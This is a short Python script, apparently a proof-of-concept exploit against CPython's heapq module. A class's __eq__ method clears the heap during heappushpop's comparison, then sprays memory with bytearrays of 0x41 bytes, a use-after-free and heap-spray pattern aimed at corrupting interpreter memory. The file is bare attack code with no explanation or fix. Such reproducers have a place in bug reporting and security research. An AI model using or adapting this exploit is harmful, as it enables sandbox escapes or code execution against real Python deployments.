import heapq, sys
size = int(sys.argv[1])
class Evil1:
    def __eq__(self, other):
        dummy = [(i, i, i) for i in range(10000)]
        del dummy
        heap.clear()
        payload = bytearray(b'\x41' * size)
        global spray
        spray = [bytearray(payload) for _ in range(10000)]
        return True
class Evil2:
    def __gt__(self, other): return True
heap = [(Evil1(), 0, 0)]
try: heapq.heappushpop(heap, (0, Evil2(), 0))
except Exception as e: pass
